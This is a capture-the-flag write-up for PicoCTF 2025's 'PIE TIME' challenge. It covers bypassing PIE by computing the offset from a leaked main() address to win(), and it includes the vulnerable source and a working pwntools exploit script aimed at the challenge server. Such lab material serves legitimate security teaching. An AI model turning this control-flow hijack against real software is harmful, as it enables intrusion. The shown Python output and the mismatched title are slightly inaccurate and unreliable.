---
title: Format String 0
parent: easy
grand_parent: pwn
great_grand_parent: PicoCTF
nav_order: 3
---

# PIE TIME - PicoCTF 2025

**Category:** Binary Exploitation  
**Difficulty:** Easy  
**Tags:** PIE, Offset Calculation, pwntools, pwndbg

---

## Challenge Description

> Can you try to get the flag? Beware we have PIE!
>
> Files provided:
> - `vuln` (binary)
> - `vuln.c` (source code)
> - Remote instance: `nc rescued-float.picoctf.net <port>`

> <details>
>   <summary>Hints</summary>
>   Can you figure out what changed between the address you found locally and in the server output?
> </details>

---

## Initial Analysis

Upon reading the description and reviewing the source code, it's clear that:

- PIE (Position Independent Executable) is enabled

> PIE, or Position Independent Executable, randomizes the base address of the binary at runtime, meaning absolute addresses change every run. This prevents us from hardcoding the address of win(). However, offsets between functions remain constant because they are relative to the PIE base.

---

## Source Code Analysis

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

### Key Observations

- The program directly prints the address of `main()` at runtime
- The program allows arbitrary function pointer execution by letting us input any address to call
- PIE randomizes base addresses, but internal offsets remain constant
- The `win()` function reads and prints the flag if executed

---

## Static Binary Analysis

We analyze the binary with pwndbg to find the static offset between main() and win():

```sh
$ pwndbg ./vuln           
[snip...]
pwndbg> disassemble main
Dump of assembler code for function main:
   0x000000000000133d <+0>:     endbr64
[snip...]
pwndbg> disassemble win
Dump of assembler code for function win:
   0x00000000000012a7 <+0>:     endbr64
[snip...]
```

### Offset Calculation

```
$ python3
>>> main_addr = 0x133d  
>>> win_addr  = 0x12a7  
>>> offset = main_addr - win_addr
>>> print(offset)
0x96
```

**The key realization is that this offset remains fixed regardless of PIE randomization.**

---

## Exploitation

### Plan

1. Leak the runtime address of main() (given).
2. Subtract 0x96 to calculate the runtime address of win().
3. Input this address and trigger execution

### Manual Exploitation

```
$ nc rescued-float.picoctf.net <port>

Address of main: 0x613514f6433d
Enter the address to jump to, ex => 0x12345: 0x613514f642a7
Your input: 613514f642a7
You won!
picoCTF{<redacted>}
```

### Automated Exploitation with pwntools

```python
from pwn import *
import sys

if len(sys.argv) != 2:
  print(f"Usage: {sys.argv[0]} <port>")
  sys.exit(1)

host = 'rescued-float.picoctf.net'
port = int(sys.argv[1])

conn = remote(host, port)

# Parse leaked address of main
leak_line = conn.recvline().decode().strip()
main_addr = int(leak_line.split(": ")[1], 16)

# Offset from static analysis
offset = 0x96
win_addr = main_addr - offset

# Send calculated win address
conn.sendline(hex(win_addr))

# Receive flag
conn.recvuntil(b"You won!\n")
print(conn.recvall().decode())
```

---

## Key Takeaways
- PIE randomizes binary base addresses but not relative offsets
- Leaking function addresses enables reliable exploitation via offset calculation
- pwndbg are essential tools for static binary analysis
